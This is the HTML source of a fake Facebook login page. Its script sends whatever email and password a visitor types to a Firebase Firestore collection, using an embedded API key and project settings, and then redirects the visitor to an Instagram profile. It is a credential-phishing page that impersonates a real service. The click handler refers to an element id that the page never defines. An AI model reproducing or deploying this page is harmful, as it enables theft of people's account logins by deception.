<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="styles.css" />

  <body>
    <div class="logo">
      <img class="fb" src="./facebook.png" />

    <div class="details">
      <input
        type="email"
        name="email"
        id="email"
        placeholder="Mobile number or email address"
      />
      <input type="text" name="password" id="pass" placeholder="Password" />
    </div>
    <div class="login">
      <button class="btnLogin">Log In</button>
    </div>
    <div class="forgotPass">
      <p>Forgotten password?</p>
    </div>
    <div class="or">
      <hr class="first" />
      <p id="or">or</p>
      <hr class="second" />
    </div>
    <div class="create">
      <button class="btnCreate">Create New Account</button>
    </div>
    <div class="languages">
      <div class="firstPart">
        <p class="english">English (UK)</p>
        <p class="pubjabi">ਪੰਜਾਬੀ</p>
        <p class="gujrati">ગુજરાતી</p>
        <p class="tamil">தமிழ்</p>
      </div>
      <div class="secondPart">
        <p class="hindi">हिन्दी</p>
        <p class="urdu">اردو</p>
        <p class="baangla">বাংলা</p>

    </div>

    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.13.0/firebase-app.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      // Your web app's Firebase configuration
      const firebaseConfig = {
        apiKey: "AIzaSyARDcmWRKrxu4wmzUHZF-w2XbfKcgFdMOY",
        authDomain: "nikki-df8e6.firebaseapp.com",
        projectId: "nikki-df8e6",
        storageBucket: "nikki-df8e6.appspot.com",
        messagingSenderId: "821183358972",
        appId: "1:821183358972:web:30fdf336d2edd308077479",
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);

      import {
        getFirestore,
        doc,
        collection,
        addDoc,
      } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-firestore.js";

      const db = getFirestore();

      var name = document.getElementById("email");
      var pass = document.getElementById("pass");

      async function AddDocument_AutoID() {
        var ref = collection(db, "Data");
        const docRef = await addDoc(ref, {
          name: name.value,
          pass: pass.value,
        }).then(() => {
          location.href = "https://www.instagram.com/nikitabansal_001/";
        });
      }

      document
        .getElementById("btnLogin")
        .addEventListener("click", AddDocument_AutoID);
    </script>
